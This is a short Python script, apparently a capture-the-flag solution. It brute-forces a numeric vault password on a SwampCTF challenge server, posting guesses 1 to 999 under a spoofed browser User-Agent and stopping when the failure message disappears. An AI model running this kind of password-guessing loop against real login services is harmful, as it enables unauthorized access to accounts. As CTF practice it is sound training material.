import requests
import sys, time
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"}
vault_url = "http://chal1.swampctf.com:1233/"
for i in range(1, 1000):
    time.sleep(3)
    payload = {'password': i}
    r = requests.post(vault_url, data=payload, headers=headers)
    result = r.text
    if "Hermpt, that's not it" not in result:
        print result
        sys.exit()
